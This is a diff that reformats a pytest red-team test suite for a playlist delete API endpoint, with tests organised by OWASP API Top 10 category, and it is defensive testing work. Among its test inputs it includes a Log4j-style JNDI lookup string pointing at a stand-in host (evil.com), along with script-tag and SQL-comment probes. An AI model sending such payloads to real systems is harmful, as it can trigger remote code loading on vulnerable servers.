@@ -10,9 +10,11 @@ Tests focus on finding vulnerabilities using OWASP API Top 10 methodology:
 
 import json
 import time
+
 from concurrent.futures import ThreadPoolExecutor
 
 import pytest
+
 from model_bakery import baker
 
 from api.core.models import User
@@ -48,15 +50,20 @@ class TestPlaylistDeleteRedTeam:
         # Expected: 403 or 404 (should not be visible/deletable)
         # Actual: 204 (BOLA vulnerability)
         response = api_client.delete(f"/api/v2/playlists/{playlist.id}")
-        assert response.status_code in [403, 404], \
-            f"BOLA: Attacker deleted victim's playlist with status {response.status_code}"
-        assert Playlist.objects.filter(id=playlist.id).exists(), \
-            "BOLA: Victim's playlist was deleted by attacker"
+        assert response.status_code in [
+            403,
+            404,
+        ], f"BOLA: Attacker deleted victim's playlist with status {response.status_code}"
+        assert Playlist.objects.filter(
+            id=playlist.id,
+        ).exists(), "BOLA: Victim's playlist was deleted by attacker"
 
     @pytest.mark.xfail(reason="T420: BOLA vulnerability - no owner filtering")
     def test_bola_delete_multiple_other_users_playlists(self, api_client):
         """BOLA: Mass deletion of other users' playlists should fail."""
-        victims = [baker.make(User, username=f"testred_victim_{i}") for i in range(5)]
+        victims = [
+            baker.make(User, username=f"testred_victim_{i}") for i in range(5)
+        ]
         playlists = [
             baker.make(Playlist, name=f"Victim Playlist {i}", owner=victims[i])
             for i in range(5)
@@ -69,8 +76,9 @@ class TestPlaylistDeleteRedTeam:
 
         # All playlists should still exist
         remaining = Playlist.objects.filter(id__in=playlist_ids).count()
-        assert remaining == 5, \
-            f"BOLA: Attacker deleted {5 - remaining} victim playlists"
+        assert (
+            remaining == 5
+        ), f"BOLA: Attacker deleted {5 - remaining} victim playlists"
 
     @pytest.mark.xfail(reason="T420: BOLA vulnerability - ID predictable")
     def test_bola_id_prediction_delete_sequential(self, api_client):
@@ -91,8 +99,11 @@ class TestPlaylistDeleteRedTeam:
 
         # All victim playlists should still exist
         for playlist in playlists:
-            assert Playlist.objects.filter(id=playlist.id).exists(), \
+            assert Playlist.objects.filter(
+                id=playlist.id,
+            ).exists(), (
                 f"BOLA: Predicted ID attack deleted playlist {playlist.id}"
+            )
 
     # ========================================================================
     # API3:2023 - BOPLA (Broken Object Property Level Authorization)
@@ -118,8 +129,9 @@ class TestPlaylistDeleteRedTeam:
             data = response.json() if response.content else {}
             sensitive_fields = ["password", "token", "secret", "internal_id"]
             for field in sensitive_fields:
-                assert field not in data, \
-                    f"BOPLA: Sensitive field '{field}' leaked in delete response"
+                assert (
+                    field not in data
+                ), f"BOPLA: Sensitive field '{field}' leaked in delete response"
 
     # ========================================================================
     # Injection Attacks
@@ -141,8 +153,11 @@ class TestPlaylistDeleteRedTeam:
             response = api_client.delete(f"/api/v2/playlists/{payload}")
             # Should return 404 (not found) or 400 (bad request)
             # Should NOT execute SQL or return 500
-            assert response.status_code in [400, 404, 405], \
-                f"SQLi: Payload '{payload}' caused status {response.status_code}"
+            assert response.status_code in [
+                400,
+                404,
+                405,
+            ], f"SQLi: Payload '{payload}' caused status {response.status_code}"
 
     def test_nosql_injection_delete(self, api_client):
         """NoSQLi: MongoDB-style operators in ID should not work."""
@@ -157,8 +172,10 @@ class TestPlaylistDeleteRedTeam:
         for payload in nosql_payloads:
             response = api_client.delete(f"/api/v2/playlists/{payload}")
             # Should return 404 or 400, never succeed
-            assert response.status_code in [400, 404], \
-                f"NoSQLi: Payload '{payload}' caused status {response.status_code}"
+            assert response.status_code in [
+                400,
+                404,
+            ], f"NoSQLi: Payload '{payload}' caused status {response.status_code}"
 
     def test_path_traversal_delete(self, api_client):
         """Path traversal: Directory traversal in ID should not work."""
@@ -172,8 +189,10 @@ class TestPlaylistDeleteRedTeam:
 
         for payload in traversal_payloads:
             response = api_client.delete(f"/api/v2/playlists/{payload}")
-            assert response.status_code in [400, 404], \
-                f"Traversal: Payload '{payload}' caused status {response.status_code}"
+            assert response.status_code in [
+                400,
+                404,
+            ], f"Traversal: Payload '{payload}' caused status {response.status_code}"
 
     # ========================================================================
     # API6:2023 - Unrestricted Resource Consumption
@@ -214,10 +233,11 @@ class TestPlaylistDeleteRedTeam:
         elapsed = time.time() - start_time
 
         # Should return quickly (< 2 seconds)
-        assert elapsed < 2.0, \
-            f"DoS: Long ID caused {elapsed}s response time"
-        assert response.status_code in [400, 404], \
-            f"Unexpected status for long ID: {response.status_code}"
+        assert elapsed < 2.0, f"DoS: Long ID caused {elapsed}s response time"
+        assert response.status_code in [
+            400,
+            404,
+        ], f"Unexpected status for long ID: {response.status_code}"
 
     # ========================================================================
     # API8:2023 - Security Misconfiguration
@@ -241,11 +261,14 @@ class TestPlaylistDeleteRedTeam:
         # Either should not delete (200/403) or respect auth
         # If it deletes, that's a critical vulnerability
         if response.status_code == 204:
-            assert False, "CRITICAL: Method override bypassed auth and deleted resource"
+            assert (
+                False
+            ), "CRITICAL: Method override bypassed auth and deleted resource"
 
         # Playlist should still exist
-        assert Playlist.objects.filter(id=playlist.id).exists(), \
-            "Method override deleted playlist without proper auth"
+        assert Playlist.objects.filter(
+            id=playlist.id,
+        ).exists(), "Method override deleted playlist without proper auth"
 
     def test_delete_with_trace_method(self, api_client):
         """Security misconfig: TRACE method should not delete."""
@@ -256,12 +279,15 @@ class TestPlaylistDeleteRedTeam:
         response = api_client.trace(f"/api/v2/playlists/{playlist.id}")
 
         # TRACE should not be allowed or should not delete
-        assert response.status_code in [405, 501], \
-            f"TRACE method returned {response.status_code}"
+        assert response.status_code in [
+            405,
+            501,
+        ], f"TRACE method returned {response.status_code}"
 
         # Playlist should still exist
-        assert Playlist.objects.filter(id=playlist.id).exists(), \
-            "TRACE method deleted the playlist"
+        assert Playlist.objects.filter(
+            id=playlist.id,
+        ).exists(), "TRACE method deleted the playlist"
 
     # ========================================================================
     # Business Logic Bypasses
@@ -292,7 +318,7 @@ class TestPlaylistDeleteRedTeam:
 
         # If ownership transfer worked, original owner shouldn't delete
         # This test documents expected behavior after fix
-        pass  # Placeholder for complex auth scenario
+        # Placeholder for complex auth scenario
 
     def test_double_delete_race_condition(self, api_client):
         """Race condition: Simultaneous delete requests."""
@@ -311,8 +337,9 @@ class TestPlaylistDeleteRedTeam:
 
         # One should succeed (204), one should fail (404)
         statuses = {response1.status_code, response2.status_code}
-        assert statuses == {204, 404} or statuses == {204} or statuses == {404}, \
-            f"Race condition: got statuses {statuses}"
+        assert (
+            statuses == {204, 404} or statuses == {204} or statuses == {404}
+        ), f"Race condition: got statuses {statuses}"
 
     # ========================================================================
     # Edge Cases and Input Validation
@@ -322,26 +349,39 @@ class TestPlaylistDeleteRedTeam:
         """Input validation: Unicode characters in ID should be rejected."""
         unicode_ids = [
             "test\u0000",  # Null byte
-            "test\n",      # Newline
-            "test\r",      # Carriage return
-            "日本語",        # Japanese
-            "<script>",    # XSS attempt
-            "'--",         # SQL comment
+            "test\n",  # Newline
+            "test\r",  # Carriage return
+            "日本語",  # Japanese
+            "<script>",  # XSS attempt
+            "'--",  # SQL comment
         ]
 
         for uid in unicode_ids:
             response = api_client.delete(f"/api/v2/playlists/{uid}")
-            assert response.status_code in [400, 404], \
-                f"Unicode ID '{repr(uid)}' caused {response.status_code}"
+            assert response.status_code in [
+                400,
+                404,
+            ], f"Unicode ID '{repr(uid)}' caused {response.status_code}"
 
     def test_delete_boolean_id(self, api_client):
         """Input validation: Boolean-like IDs should be rejected."""
-        bool_ids = ["true", "false", "True", "False", "TRUE", "FALSE", "1", "0"]
+        bool_ids = [
+            "true",
+            "false",
+            "True",
+            "False",
+            "TRUE",
+            "FALSE",
+            "1",
+            "0",
+        ]
 
         for bid in bool_ids:
             response = api_client.delete(f"/api/v2/playlists/{bid}")
-            assert response.status_code in [400, 404], \
-                f"Boolean ID '{bid}' caused {response.status_code}"
+            assert response.status_code in [
+                400,
+                404,
+            ], f"Boolean ID '{bid}' caused {response.status_code}"
 
     def test_delete_null_and_empty(self, api_client):
         """Input validation: null and empty ID handling."""
@@ -363,7 +403,7 @@ class TestPlaylistDeleteRedTeam:
         # Try to delete with various malformed IDs
         test_ids = [
             "1'",
-            "1\"",
+            '1"',
             "1;",
             "../../",
             "${jndi:ldap://evil.com}",  # Log4j-style
@@ -375,13 +415,21 @@ class TestPlaylistDeleteRedTeam:
                 content = response.content.decode().lower()
                 # Check for information leakage
                 leaks = [
-                    "sql", "sqlite", "postgresql", "mysql",
-                    "django", "traceback", "exception",
-                    "password", "secret", "key",
+                    "sql",
+                    "sqlite",
+                    "postgresql",
+                    "mysql",
+                    "django",
+                    "traceback",
+                    "exception",
+                    "password",
+                    "secret",
+                    "key",
                 ]
                 for leak in leaks:
-                    assert leak not in content, \
-                        f"Info leak: '{leak}' found in error response for ID '{tid}'"
+                    assert (
+                        leak not in content
+                    ), f"Info leak: '{leak}' found in error response for ID '{tid}'"
 
     def test_delete_timing_attack(self, api_client):
         """Timing attack: Response time should not reveal existence."""
@@ -400,5 +448,6 @@ class TestPlaylistDeleteRedTeam:
 
         # Times should be similar (no oracle)
         diff = abs(time_existing - time_nonexistent)
-        assert diff < 0.5, \
-            f"Timing attack: {diff}s difference between existing/non-existing"
+        assert (
+            diff < 0.5
+        ), f"Timing attack: {diff}s difference between existing/non-existing"
